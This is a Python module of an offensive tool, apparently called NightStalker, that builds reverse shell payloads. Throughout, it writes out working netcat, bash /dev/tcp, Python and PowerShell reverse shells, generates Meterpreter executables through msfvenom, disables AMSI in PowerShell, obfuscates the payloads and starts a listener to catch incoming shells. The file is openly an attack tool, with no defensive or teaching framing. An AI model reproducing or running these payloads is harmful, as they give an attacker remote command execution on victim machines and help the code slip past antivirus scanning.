#!/usr/bin/env python3
"""
NightStalker Reverse Shell Deployer
Deploys reverse shells with obfuscation and multiple payload types
"""

import os
import sys
import subprocess
import tempfile
import shutil
import time
import random
import string
from pathlib import Path
from typing import Dict, List, Optional, Tuple
import json
import base64
import hashlib

from ..utils.logger import Logger
from ..utils.config import Config
from ..builder.payload_builder import PayloadBuilder
from ..builder.polymorph import PolymorphEngine


class ReverseShellDeployer:
    """Deploys reverse shells with obfuscation and multiple payload types"""
    
    def __init__(self):
        self.logger = Logger(__name__)
        self.config = Config()
        self.payload_builder = PayloadBuilder()
        self.polymorph = PolymorphEngine()
        
        # Supported payload types
        self.payload_types = {
            'nc': 'Netcat reverse shell',
            'msfvenom': 'Metasploit msfvenom payload',
            'python': 'Python reverse shell script',
            'bash': 'Bash reverse shell script',
            'powershell': 'PowerShell reverse shell script'
        }
        
        # Default settings
        self.default_port = 4444
        self.default_interface = 'eth0'
        self.obfuscation_enabled = True
        
    def get_network_info(self) -> Dict[str, str]:
        """Get network interface information"""
        try:
            # Get local IP address
            import socket
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.connect(("8.8.8.8", 80))
            local_ip = s.getsockname()[0]
            s.close()
            
            return {
                'local_ip': local_ip,
                'interface': self.default_interface
            }
        except Exception as e:
            self.logger.error(f"Failed to get network info: {e}")
            return {
                'local_ip': '127.0.0.1',
                'interface': self.default_interface
            }
    
    def prompt_deployment_options(self) -> Dict:
        """Interactive prompt for deployment options"""
        print("\n" + "="*60)
        print("🌙 NIGHTSTALKER REVERSE SHELL DEPLOYER")
        print("="*60)
        
        # Get network info
        network_info = self.get_network_info()
        
        # Payload type selection
        print("\n📋 Available Payload Types:")
        for key, desc in self.payload_types.items():
            print(f"  {key}: {desc}")
        
        while True:
            payload_type = input(f"\n🎯 Select payload type (default: msfvenom): ").strip().lower()
            if not payload_type:
                payload_type = 'msfvenom'
            if payload_type in self.payload_types:
                break
            print("❌ Invalid payload type. Please try again.")
        
        # Target IP
        target_ip = input(f"\n🎯 Target IP address (default: {network_info['local_ip']}): ").strip()
        if not target_ip:
            target_ip = network_info['local_ip']
        
        # Port
        while True:
            port_input = input(f"\n🔌 Port (default: {self.default_port}): ").strip()
            if not port_input:
                port = self.default_port
                break
            try:
                port = int(port_input)
                if 1 <= port <= 65535:
                    break
                print("❌ Port must be between 1 and 65535")
            except ValueError:
                print("❌ Invalid port number")
        
        # Obfuscation (default: enabled)
        obfuscation_input = input(f"\n🔒 Enable obfuscation (default: yes): ").strip().lower()
        if not obfuscation_input or obfuscation_input in ['y', 'yes', '1']:
            obfuscation = True
        else:
            obfuscation = False
        
        # Additional options based on payload type
        options = {}
        
        if payload_type == 'msfvenom':
            print("\n📦 Metasploit Payload Options:")
            print("  Available payloads: windows/meterpreter/reverse_tcp, linux/x86/shell_reverse_tcp")
            payload_name = input("  Payload name (default: windows/meterpreter/reverse_tcp): ").strip()
            if not payload_name:
                payload_name = 'windows/meterpreter/reverse_tcp'
            options['payload_name'] = payload_name
            
            format_type = input("  Output format (default: exe): ").strip()
            if not format_type:
                format_type = 'exe'
            options['format'] = format_type
        
        elif payload_type in ['python', 'bash', 'powershell']:
            # Script-specific options
            if payload_type == 'python':
                options['use_requests'] = input("  Use requests library (y/n, default: y): ").strip().lower() != 'n'
            elif payload_type == 'powershell':
                options['bypass_amsi'] = input("  Bypass AMSI (y/n, default: y): ").strip().lower() != 'n'
        
        # Deployment method
        print("\n📤 Deployment Methods:")
        print("  1: Save to file")
        print("  2: Copy to clipboard")
        print("  3: Start listener automatically")
        print("  4: All of the above")
        
        while True:
            deploy_method = input("  Select deployment method (default: 1): ").strip()
            if not deploy_method:
                deploy_method = '1'
            if deploy_method in ['1', '2', '3', '4']:
                break
            print("❌ Invalid option")
        
        return {
            'payload_type': payload_type,
            'target_ip': target_ip,
            'port': port,
            'obfuscation': obfuscation,
            'options': options,
            'deploy_method': deploy_method
        }
    
    def generate_nc_payload(self, target_ip: str, port: int) -> str:
        """Generate netcat reverse shell payload"""
        nc_payloads = {
            'linux': f"nc -e /bin/sh {target_ip} {port}",
            'windows': f"nc.exe -e cmd.exe {target_ip} {port}",
            'bash': f"bash -i >& /dev/tcp/{target_ip}/{port} 0>&1",
            'python': f"python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"{target_ip}\",{port}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"]);'"
        }
        
        return nc_payloads
    
    def generate_msfvenom_payload(self, target_ip: str, port: int, options: Dict) -> str:
        """Generate Metasploit msfvenom payload"""
        payload_name = options.get('payload_name', 'windows/meterpreter/reverse_tcp')
        format_type = options.get('format', 'exe')
        
        cmd = [
            'msfvenom',
            '-p', payload_name,
            f'LHOST={target_ip}',
            f'LPORT={port}',
            '-f', format_type,
            '--platform', 'windows' if 'windows' in payload_name else 'linux',
            '--arch', 'x86' if 'x86' in payload_name else 'x64'
        ]
        
        try:
            result = subprocess.run(cmd, capture_output=True, text=True, check=True)
            return result.stdout
        except subprocess.CalledProcessError as e:
            self.logger.error(f"msfvenom failed: {e}")
            return None
    
    def generate_script_payload(self, payload_type: str, target_ip: str, port: int, options: Dict) -> str:
        """Generate script-based reverse shell payloads"""
        
        if payload_type == 'python':
            use_requests = options.get('use_requests', True)
            
            if use_requests:
                script = f'''#!/usr/bin/env python3
import requests
import subprocess
import os
import socket
import time

def reverse_shell():
    host = "{target_ip}"
    port = {port}
    
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((host, port))
            
            while True:
                command = s.recv(1024).decode().strip()
                if command.lower() in ['quit', 'exit']:
                    s.close()
                    return
                
                try:
                    output = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT)
                    s.send(output)
                except Exception as e:
                    s.send(str(e).encode())
                    
        except Exception as e:
            time.sleep(5)
            continue

if __name__ == "__main__":
    reverse_shell()
'''
            else:
                script = f'''#!/usr/bin/env python3
import socket
import subprocess
import os

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("{target_ip}", {port}))
os.dup2(s.fileno(), 0)
os.dup2(s.fileno(), 1)
os.dup2(s.fileno(), 2)
subprocess.call(["/bin/sh", "-i"])
'''
        
        elif payload_type == 'bash':
            script = f'''#!/bin/bash
while true; do
    bash -i >& /dev/tcp/{target_ip}/{port} 0>&1
    sleep 5
done
'''
        
        elif payload_type == 'powershell':
            bypass_amsi = options.get('bypass_amsi', True)
            
            if bypass_amsi:
                script = f'''# PowerShell Reverse Shell with AMSI Bypass
$amsi = [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')
$field = $amsi.GetField('amsiInitFailed', 'NonPublic,Static')
$field.SetValue($null, $true)

$client = New-Object System.Net.Sockets.TCPClient("{target_ip}", {port})
$stream = $client.GetStream()
[byte[]]$bytes = 0..65535|%{{0}}
while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0) {{
    $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes, 0, $i)
    $sendback = (iex $data 2>&1 | Out-String )
    $sendback2 = $sendback + "PS " + (pwd).Path + "> "
    $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2)
    $stream.Write($sendbyte, 0, $sendbyte.Length)
    $stream.Flush()
}}
$client.Close()
'''
            else:
                script = f'''# PowerShell Reverse Shell
$client = New-Object System.Net.Sockets.TCPClient("{target_ip}", {port})
$stream = $client.GetStream()
[byte[]]$bytes = 0..65535|%{{0}}
while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0) {{
    $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes, 0, $i)
    $sendback = (iex $data 2>&1 | Out-String )
    $sendback2 = $sendback + "PS " + (pwd).Path + "> "
    $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2)
    $stream.Write($sendbyte, 0, $sendbyte.Length)
    $stream.Flush()
}}
$client.Close()
'''
        
        return script
    
    def obfuscate_payload(self, payload: str, payload_type: str) -> str:
        """Apply obfuscation to the payload"""
        if not self.obfuscation_enabled:
            return payload
        
        self.logger.info("Applying obfuscation to payload...")
        
        if payload_type == 'python':
            return self.polymorph.obfuscate_python(payload)
        elif payload_type == 'bash':
            return self.polymorph.obfuscate_bash(payload)
        elif payload_type == 'powershell':
            return self.polymorph.obfuscate_powershell(payload)
        else:
            # For binary payloads, we can't obfuscate directly
            return payload
    
    def save_to_file(self, payload: str, payload_type: str, options: Dict) -> str:
        """Save payload to file"""
        timestamp = int(time.time())
        random_suffix = ''.join(random.choices(string.ascii_lowercase, k=6))
        
        if payload_type == 'msfvenom':
            # msfvenom already outputs binary, save as is
            filename = f"payload_{timestamp}_{random_suffix}.{options.get('format', 'exe')}"
        else:
            # Script payloads
            extensions = {
                'python': '.py',
                'bash': '.sh',
                'powershell': '.ps1',
                'nc': '.txt'
            }
            ext = extensions.get(payload_type, '.txt')
            filename = f"reverse_shell_{timestamp}_{random_suffix}{ext}"
        
        filepath = os.path.join(self.config.get('output_dir', 'payloads'), filename)
        os.makedirs(os.path.dirname(filepath), exist_ok=True)
        
        with open(filepath, 'w') as f:
            f.write(payload)
        
        self.logger.success(f"Payload saved to: {filepath}")
        return filepath
    
    def copy_to_clipboard(self, payload: str) -> bool:
        """Copy payload to clipboard"""
        try:
            import pyperclip
            pyperclip.copy(payload)
            self.logger.success("Payload copied to clipboard")
            return True
        except ImportError:
            self.logger.warning("pyperclip not installed, skipping clipboard copy")
            return False
        except Exception as e:
            self.logger.error(f"Failed to copy to clipboard: {e}")
            return False
    
    def start_listener(self, port: int) -> None:
        """Start netcat listener"""
        print(f"\n🎧 Starting netcat listener on port {port}...")
        print(f"Run this command in another terminal:")
        print(f"nc -lvp {port}")
        
        # Optionally start listener automatically
        auto_start = input("Start listener automatically? (y/n): ").strip().lower()
        if auto_start in ['y', 'yes']:
            try:
                cmd = f"nc -lvp {port}"
                print(f"Starting: {cmd}")
                subprocess.Popen(cmd, shell=True)
                self.logger.success(f"Listener started on port {port}")
            except Exception as e:
                self.logger.error(f"Failed to start listener: {e}")
    
    def deploy(self, options: Optional[Dict] = None) -> Dict:
        """Main deployment method"""
        if options is None:
            options = self.prompt_deployment_options()
        
        payload_type = options['payload_type']
        target_ip = options['target_ip']
        port = options['port']
        obfuscation = options['obfuscation']
        deploy_method = options['deploy_method']
        
        self.logger.info(f"Deploying {payload_type} reverse shell to {target_ip}:{port}")
        
        # Generate payload
        if payload_type == 'nc':
            payloads = self.generate_nc_payload(target_ip, port)
            payload = payloads['bash']  # Default to bash version
            
        elif payload_type == 'msfvenom':
            payload = self.generate_msfvenom_payload(target_ip, port, options['options'])
            if not payload:
                return {'success': False, 'error': 'Failed to generate msfvenom payload'}
                
        else:  # Script payloads
            payload = self.generate_script_payload(payload_type, target_ip, port, options['options'])
        
        # Apply obfuscation if enabled
        if obfuscation:
            payload = self.obfuscate_payload(payload, payload_type)
        
        # Deploy based on method
        results = {'success': True, 'payload': payload}
        
        if deploy_method in ['1', '4']:  # Save to file
            filepath = self.save_to_file(payload, payload_type, options['options'])
            results['filepath'] = filepath
        
        if deploy_method in ['2', '4']:  # Copy to clipboard
            self.copy_to_clipboard(payload)
        
        if deploy_method in ['3', '4']:  # Start listener
            self.start_listener(port)
        
        # Display payload
        print(f"\n📦 Generated Payload ({payload_type}):")
        print("-" * 50)
        print(payload)
        print("-" * 50)
        
        return results
    
    def list_payloads(self) -> None:
        """List available payload types"""
        print("\n📋 Available Reverse Shell Payload Types:")
        print("-" * 50)
        for key, desc in self.payload_types.items():
            print(f"  {key:12} - {desc}")
        print("-" * 50)
    
    def cleanup(self) -> None:
        """Clean up temporary files"""
        temp_dir = tempfile.gettempdir()
        for file in os.listdir(temp_dir):
            if file.startswith('nightstalker_'):
                try:
                    os.remove(os.path.join(temp_dir, file))
                except:
                    pass


def main():
    """CLI entry point"""
    deployer = ReverseShellDeployer()
    
    if len(sys.argv) > 1:
        command = sys.argv[1]
        
        if command == 'list':
            deployer.list_payloads()
        elif command == 'deploy':
            deployer.deploy()
        else:
            print("Usage: reverse_shell_deployer.py [list|deploy]")
    else:
        deployer.deploy()


if __name__ == "__main__":
    main() 